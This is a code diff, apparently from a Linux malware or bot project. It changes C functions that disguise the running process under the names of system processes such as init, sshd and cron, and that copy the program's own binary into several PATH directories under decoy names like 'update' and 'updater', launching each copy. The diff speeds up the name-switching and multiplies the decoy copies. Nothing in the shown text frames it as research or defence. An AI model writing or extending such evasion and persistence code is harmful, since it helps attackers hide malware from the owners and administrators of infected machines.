@@ -12,7 +12,7 @@ void* rename_process(void* arg) {
         const char* names[] = {"init", "bash", "cron", "sshd"};
         const char* new_name = names[rand() % 4];
         strncpy((char*)getenv("_"), new_name, strlen(new_name));
-        sleep(30);  // 30s
+        sleep(15);  // 15s better?
     }
     return NULL;
 }
@@ -89,7 +89,8 @@ void daemonize(int argc, char** argv) {
         "/usr/local/games/",
         "/snap/bin/"
     };
-    const char* daemon_name = "update";
+    const char* daemon_names[] = {"update", "lists", "servers", "updater"};
+    int daemon_names_count = sizeof(daemon_names) / sizeof(daemon_names[0]);
 
     char source_path[256];
     char dest_path[256];
@@ -99,9 +100,11 @@ void daemonize(int argc, char** argv) {
     }
 
     for (int i = 0; i < sizeof(dirs) / sizeof(dirs[0]); i++) {
-        snprintf(dest_path, sizeof(dest_path), "%s%s", dirs[i], daemon_name);
-        if (copy_file(source_path, dest_path) == 0) {
-            run_clone(dest_path, argc, argv);
+        for (int j = 0; j < daemon_names_count; j++) {
+            snprintf(dest_path, sizeof(dest_path), "%s%s", dirs[i], daemon_names[j]);
+            if (copy_file(source_path, dest_path) == 0) {
+                run_clone(dest_path, argc, argv);
+            }
         }
     }
 
